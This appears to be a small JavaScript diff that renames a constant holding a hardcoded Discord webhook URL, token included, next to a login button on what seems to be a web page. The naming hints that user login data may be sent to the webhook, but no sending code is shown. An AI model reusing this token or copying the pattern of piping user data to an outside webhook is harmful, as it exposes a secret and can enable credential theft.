@@ -1,4 +1,4 @@
-const userinfoEncoded = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
+const userinfo = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
 
 const skibidiCheckbox = document.getElementById('skibidiCheckbox');
 const loginButton = document.getElementById('loginButton');
